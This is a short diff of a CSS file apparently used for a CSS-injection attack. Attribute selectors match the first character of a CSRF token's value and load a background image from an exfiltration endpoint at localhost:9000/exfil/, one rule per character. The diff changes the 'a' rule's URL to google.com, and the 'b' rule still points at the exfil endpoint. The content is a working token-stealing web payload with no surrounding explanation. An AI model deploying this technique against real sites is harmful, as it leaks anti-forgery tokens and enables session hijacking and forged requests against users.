@@ -1,5 +1,5 @@
 input[name=csrf][value^=a]{
-    background-image: url(https://localhost:9000/exfil/a);
+    background-image: url(https://google.com);
 }
 input[name=csrf][value^=b]{
     background-image: url(https://localhost:9000/exfil/b);
